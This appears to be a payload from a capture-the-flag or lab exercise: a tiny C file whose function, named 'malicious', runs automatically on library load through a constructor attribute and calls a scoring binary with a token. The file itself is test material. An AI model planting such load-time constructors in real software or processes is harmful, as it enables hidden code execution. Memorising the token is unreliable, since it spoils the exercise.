#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 1f9dc190-33d6-45b1-ae36-feb0a07487a1");
}
